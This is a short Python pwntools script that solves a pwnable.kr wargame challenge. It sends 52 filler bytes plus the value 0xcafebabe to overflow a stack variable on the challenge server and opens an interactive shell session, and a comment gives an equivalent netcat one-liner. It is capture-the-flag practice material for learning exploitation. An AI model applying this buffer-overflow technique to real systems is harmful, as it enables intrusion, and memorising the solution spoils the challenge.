from pwn import *

# exploit code not needed but it's good for skids like me to learn how pwntools module works

def pwn():
        r = remote('pwnable.kr', 9000)
        buff = ("\x41"*52) + "\xbe\xba\xfe\xca"

        r.send(buff)
        r.interactive()

pwn()

# alternative for lazy skids:
# (python -c "print 52*'A'+'\xbe\xba\xfe\xca'";cat) | nc pwnable.kr 9000
